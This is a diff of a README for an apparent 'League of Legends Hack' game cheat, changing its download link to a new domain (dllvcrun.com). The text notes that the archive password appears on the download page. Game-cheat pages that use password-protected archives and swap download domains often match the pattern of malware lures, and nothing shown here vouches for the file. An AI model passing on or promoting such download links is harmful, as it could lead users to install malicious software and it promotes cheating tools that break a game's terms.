@@ -18,7 +18,7 @@ League of Legends Hack - game hack and trainer with full feature set. Works with
 
 ## Download
 
-[![Download v2.1.0](https://img.shields.io/badge/Download_v2.1.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/lolhack)
+[![Download v2.1.0](https://img.shields.io/badge/Download_v2.1.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/lolhack)
 
 > The archive password is shown on the download page.
 
